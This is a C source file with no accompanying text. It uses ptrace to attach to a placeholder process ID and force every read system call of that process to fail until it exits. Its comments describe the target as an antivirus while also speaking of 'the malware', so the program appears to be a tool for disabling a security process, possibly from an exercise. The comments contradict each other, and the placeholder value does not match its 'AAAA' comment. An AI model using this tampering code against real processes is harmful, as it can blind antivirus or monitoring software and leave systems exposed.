#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>

int pid = 0x65656565; // AAAA

int main(int argc, char **argv) 
{
    int status;
    struct user_regs_struct registers;
    
    // Make the malware stop waiting for our output by forking a child process:
    if (fork() != 0) {
        // Kill the parent process so we stop waiting from the malware
        kill(getpid(), SIGSTOP);
        return 0;
    } else {
        // Close the output stream so we stop waiting from the malware
        fclose(stdout);
        
         if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
         {
            perror("Error in attach.");
            return 1;
        }
        
        waitpid(pid, &status, 0);
    }

     while(!WIFEXITED(status)) // Antivirus is running.
     { 
        if(ptrace(PTRACE_SYSCALL, pid,  NULL, NULL) == -1)
        {
            perror("Error in syscall.");
            return 1;
        }
        waitpid(pid, &status, 0);

        // Getting register value.
        if (ptrace(PTRACE_GETREGS, pid, NULL, &registers) == -1)
        {
            perror("Error in getregs");
            return 1;
        }
        
        // Ovewriting syscall.
        if (registers.orig_eax == 3)
        {
            registers.eax = -1;
            if (ptrace(PTRACE_SETREGS, pid, NULL, &registers) == -1)
            {
                 perror("Error in setregs");
                 return 1;

            }
        }
    }
    
    // Detaching.
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1)
    {
        perror("Error in detach");
        return 1;
    } 
    
    return 0;
}
